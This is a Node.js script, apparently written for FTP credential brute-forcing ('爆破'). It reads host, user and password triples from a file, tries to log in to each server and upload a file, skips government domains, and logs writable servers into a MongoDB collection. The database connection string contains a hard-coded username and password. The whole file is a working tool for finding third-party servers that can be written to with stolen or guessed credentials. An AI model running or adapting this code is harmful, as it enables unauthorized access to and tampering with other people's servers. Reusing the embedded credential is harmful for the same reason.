const Client = require("ftp");
const _ = require("lodash");
const chalk = require("chalk");
const fs=require("fs")
const request = require('request-promise');
const sleep = require("ko-sleep");
const agent = require("secure-random-user-agent");
const moment=require("moment")
const MongoClient = require('mongodb').MongoClient;
const DB_CONN_STR = "mongodb://clyde:asdqwe123@list-shard-00-00-si9p2.mongodb.net:27017,list-shard-00-01-si9p2.mongodb.net:27017,list-shard-00-02-si9p2.mongodb.net:27017/ftp?ssl=true&replicaSet=list-shard-0&authSource=admin"

class DB{
  constructor(){
    this.db=""
    this.oldList=[]
    this.collection=""
  }
  connect(){
    return new Promise((resolve,reject)=>{
      MongoClient.connect(DB_CONN_STR, { useNewUrlParser: true } ,(err, db)=> {
          if(err){
            console.log(chalk.red(err));
            reject(err)
          }else{
            console.log("连接成功！");
            this.db=db
            this.collection=db.db('ftp').collection("ftp")
            resolve(db)
          }
      })
    })
  }
  findList(){
    return new Promise((resolve,reject)=>{
      this.collection.find({}).toArray((err, list)=>{
        if(err){
          reject(err)
        }else{
          this.oldList=list
          resolve(list)
        }
      });
    }) 
  }
  insert(data){
    return new Promise((resolve,reject)=>{
      this.collection.insertMany(data, function(err, res) { 
        if(err){
          reject(err)
        }else{
          resolve(res)
        }     
      });
    })
  }
  close(){
    try {
      this.db.close()
      console.log("断开数据库连接")
    } catch (e) {
      console.log(chalk.red(e));
    }
    
  }
}

const cp = option => {
  return new Promise((resolve, reject) => {
    let c = new Client();
    c.on("ready", () => {
      c.put('1.txt', '1.txt', function(err) {
        c.end();
        if (err){
          console.log(chalk.red(`${option.host}:失败:${err}`));
          resolve({...option,success: false})
        }else{
          console.log(chalk.green(`${option.host}:成功`));
          resolve({...option,success: true});
        }
      });
    });
    c.on("error", e => {
      c.end();
      console.log(chalk.red(`${option.host}:失败2:${e}`));
      resolve({...option,success: false});
    });
    c.connect({...option,connTimeout:10000});
  });
};



const blastOne=async info=>{
  let ftp=info.split(",")
  try{
    if(ftp[0].includes("gov.cn")||ftp[0].includes("gov.com")){
      console.log(chalk.red(`${ftp[0]}:is gov`));
      return {
        host:ftp[0],
        user:ftp[1],
        password:ftp[2],
        success:false
      }
    }else{
      let data=await cp({
        host:ftp[0],
        user:ftp[1],
        password:ftp[2]
      })
      return data
    }
  }catch(e){
    console.log(chalk.red(`${ftp[0]}:is ddddddddddddddddddddddddddddd`));
    return {
      host:ftp[0],
      user:ftp[1],
      password:ftp[2],
      success:false
    }
  }
}
const blast=async()=>{
  try {
    let res =fs.readFileSync(`${__dirname}/data/res.txt`,{encoding :"utf-8"});
    // 过滤空元素
    let arr=res.split("\r\n").filter(item=>{
      if(item) return item
    })
    console.log(`读取文件，获取到${arr.length}条数据`)
    console.log(`开始验证ftp`)
    let list=arr.map(item=>blastOne(item))
    let data=await Promise.all(list)
    //筛选出有权限上传的
    let finalRes=data.filter(item=>{
      if(item.success) return item
    })
    if(finalRes.length){
      fs.writeFileSync(`${__dirname}/data/success/${moment().format("MM-DD-HHmmss")}.txt`,finalRes.map(item=>`${item.host},${item.user},${item.password}`).join("\r\n"));
    }
    
    let failed=data.filter(item=>{
      if(!item.success) return item
    })
    if(failed.length){
      fs.writeFileSync(`${__dirname}/data/failed/${moment().format("MM-DD-HHmmss")}.txt`,failed.map(item=>`${item.host},${item.user},${item.password}`).join("\r\n"));
    }
    console.log(`一共有${finalRes.length}个ftp可以上传`)
    return finalRes
  } catch (e) {
    console.log(chalk.red(e));
  }
}
//过滤与之前重复的域名
const filter=async (newList)=>{
  let db=new DB()
  try {
    await db.connect()
    await db.findList()
    let oldList= db.oldList.map(item=>item.host)
    let repeatList=[]
    let insertList=[]
    newList.forEach(item=>{
      oldList.includes(item.host)? repeatList.push(item):insertList.push(item)
    })
    console.log(`${repeatList.length}项重复`)
    console.log(`一共有${insertList.length}项是新的爆破出来的`)
    let text=insertList.map(item=>`${item.host},${item.user},${item.password}`).join("\r\n")
    fs.writeFileSync(`${__dirname}/data/filterdata/${moment().format("MM-DD-HHmmss")}.txt`,text);
    console.log("导出文件")
    if(insertList.length) await db.insert(insertList)
    console.log("插入数据")
    
  } catch (e) {
    console.log(chalk.red(e));
  }finally{
    db.close()
  }
}
(async()=>{
  let list =await blast()
  // await filter(list)
})()
